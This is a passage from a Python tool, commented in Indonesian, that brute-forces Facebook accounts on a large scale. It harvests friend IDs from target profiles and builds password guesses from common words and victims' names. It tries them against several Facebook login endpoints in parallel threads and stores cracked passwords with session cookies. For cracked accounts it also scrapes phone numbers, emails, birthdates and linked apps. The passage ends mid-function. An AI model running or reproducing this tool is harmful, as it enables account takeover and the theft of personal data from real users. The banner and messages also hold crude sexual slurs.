#CHANG FB
#ikeh ikeh kimochi

import os, sys, subprocess, platform
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = [
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1636.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36"]
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = [
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1636.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36"]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
P = '\033[0;00m'
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
I='\033[0;32m'
II='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
b = '\033[0;36m'
war = "[•]"
B = random.choice([U,I,K,b,M])

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
    
def clear():
	os.system('clear')
def back():
	login()
def banner():
	clear()
	print("""%s
	

\x1b[38;5;208m╭────────────────────────────────────────────────────────────────────╮
\x1b[38;5;208m│\x1b[1;96m  8b    d8 888888 8b    d8 888888 88  dP \x1b[38;5;226mAuthor   : ChangFB         \x1b[38;5;208m│
\x1b[38;5;208m│\x1b[1;96m  88b  d88 88__   88b  d88 88__   88odP  \x1b[38;5;226mType     : Multibruteforce \x1b[38;5;208m│
\x1b[38;5;208m│\x1b[1;96m  88YbdP88 88""   88YbdP88 88""   88"Yb  \x1b[38;5;226mWhatsaap : 0819-0776-1235  \x1b[38;5;208m│
\x1b[38;5;208m│\x1b[1;96m  88 YY 88 888888 88 YY 88 888888 88  Yb \x1b[38;5;226mStatus   : Ngocok Memek    \x1b[38;5;208m│
\x1b[38;5;208m└────────────────────────────────────────────────────────────────────┘
"""%(kk))

def login():
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
				sy2 = json.loads(sy.text)['name']
				menu(sy2)
			except KeyError:
				login_kontol()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# KONEKSI INTERNET BERMASALAH'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_kontol()

def login_kontol():
	banner()
	print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
	print("""%s    \33[1;32mMASUKAN COOKIE FACEBOOK """%(h))
	print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
	panda = input(x+' \x1b[38;5;248m[\x1b[38;5;46m>_\x1b[38;5;248m] \33[1;96mMASUKAN COOKIE : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['name']
		print("""%s \n"""%(h))
		print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
		jalan('%s [%s>_%s] %s\33[1;96mLOGIN BERHASIL JALANKAN ULANG TOOLS'%(M,P,M,P))
		print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
		print("""%s \33[1;96mJalan kan perintah python run.py """%(h))
		time.sleep(2.5)
		exit()
	except KeyError:
		print("""%s \n"""%(h))
		jalan('%s [%s>_%s] %sLOGIN GAGAL CEK AKUN TUMBAL ANDA'%(M,P,M,P))
		time.sleep(2.5)
		login_kontol()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='yellow')
		sol().print(lo, style='cyan')
		exit()
		
def menu(my_name):
	banner()
	print(x+'\33[m[~_~]\033[96mNAMA  : \33[m'+str(my_name))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print("""%s \33[m[01] \33[1;33m """%(h))
	print("""%s \33[m[02] \33[1;33mCEK HASIL CRACK """%(h))
	print("""%s \33[m[03] \33[1;33mCEK OPSI CP """%(h))
	print("""%s \33[m[00] \33[mLOG-OUT"""%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	jh = input(x+'\33[m[?] \33[1;96mInput Number> ')
	if jh in ['1','01']:
		dump_massal()
	elif jh in ['2','02']:
		result()
	elif jh in ['3','03']:
		file()
	elif jh in ['0','00']:
		os.system('rm -rf .token.txt')
		print(x+'\33[1;96m•Sabar Nunggu Ojek ...')
		time.sleep(1)
		print("""%s \33[1;33mSUKSES KELUAR CROTT AHH """%(h))
		exit()
	else:
		print("""%s \33[1;33mNgajak gelud om pilih yang bener """%(h))
		exit()

def result():
	cek = '# CEK RESULT CRACK'
	sol().print(mark(cek, style='green'))
	kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='RESULTS'))
	kz = input(x+'['+p+'f'+x+'] Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT CP'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL CP ANDA'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd CP && cat '+geh)
			akun2 = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL OK ANDA'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='blue'))
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN OK ANDA'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# LIST AKUN OK ANDA'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()

def file():
	tek = '# CEK OPSI DARI FILE'
	sol().print(mark(tek, style='cyan'), style='on red')
	print(x+'['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	teks = '# PILIH FILE YG AKAN DI CEK'
	sol().print(mark(teks, style='green'))
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		teks2 = '# PILIH FILE YG AKAN DI CEK'
		sol().print(mark(teks2, style='green'))
		geeh = input(x+'['+p+'f'+x+'] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# PILIHAN TIDAK ADA DI MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()


def dump_massal():
	clear()
	banner()
	print("""%s  \33[m[~_~]\33[1;32mCRACK DARI ID AKUN PUBLIK\33[m[~_~]"""%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print(x+'\33[m[ ! ] \33[1;96mMASUKKAN JUMLAH ID CRACK [ limit 15 ]')
	try:
		jum = int(input(x+'\33[m[ ? ] \33[1;96mMAU CRACK BERAPA ID ? '))
	except ValueError:
		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
		pesan2 = mark(pesan, style='yellow')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# MASUKAN JUMLAH ID OM BUKAN ID NYA'
		pesan2 = mark(pesan, style='yellow')
		sol().print(pesan2)
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(x+'\33[m[ ? ] \33[1;96m•MASUKAN ID KE '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# BERHASIL DUMP %s ID '%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='cyan')
	sol().print(tot2)
	setting()

def setting():
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print("""%s \33[m[01] \33[1;32mAKUN TERTUA"""%(h))
	print("""%s \33[m[02] \33[1;32mAKUN TERMUDA """%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	hu = input(x+'\33[m[ ? ] \33[1;96mInput Number: ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	
	else:
		print("""%s \33[1;33mPilihan Tidak Ada Di Menu"""%(h))
		exit()
		
		
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print("""%s \33[1;32m[01] B-API """%(h))
	print("""%s \33[1;32m[02] MOBILE"""%(h))
	print("""%s \33[1;32m[03] MBASIC """%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	hc = input(x+'\33[m[ ? ] \33[1;96m•Input Number>  ')
	if hc in ['1','01']:
		method.append('crack2')
	elif hc in ['2','02']:
		method.append('crack')
	elif hc in ['3','03']:
		method.append('crack3')
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	aplik = input(x+'\33[m[ ? ] \33[1;32m•Tampilkan Aplikasi Terkait ? (y/t):  ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'\33[m[ ? ] \33[1;33m•Tampilkan Opsi Cekpoint ? (y/t):  ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	passwrd()

def passwrd():
	clear()
	banner()
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	print("""%s\33[m•Hasil OK  Disimpan Ke : OK/%s\n\33[m•Hasil CP Disimpan Ke : CP/%s\n\33[m•TRUN ON/OF MODE PESAWAT SETIAP 500 Id\n\33[1;33m•SAMBIL NUNGGU PROSES CRACK\n\33[1;33m•DI SARANKAN COLI OM"""%(h,okc,cpc))
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayangku','sayang123','william gz','bismillah','anjing','katasandi','sandi123,malang,bismillah123,123455,pawangku,cintasuci,kontol,tempek,jembut, ngentod,pinter,karaoke,fatimah,prasitio,khusnatun,hasanah,burung,manukku,semoga ok,yuzong,nunggu,setiap,pesawat,melaju,akuselalu,colisambil,liatpramugari']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'api' in method:
				pool.submit(crack2,idf,pwv)
			elif 'free' in method:
				pool.submit(crack3,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	woi = input(x+'\33[1;96m•Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [kang coli] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					print(f"\33[1;33m╚══[CP BARUS]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					print(f"\33[1;32m╚══[OK BARUS]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					responscee4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					print(f"\33[1;32m╚══[OK BARUS]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					cek_apk(kuki)
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack2(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [BarusV2] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack3(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [BarusV2] %s/%s ~_~ [OK:%s | CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					print(f"\33[1;33m╚══[CP BARUS]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					print(f"\33[1;32m╚══[OK BARUS]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
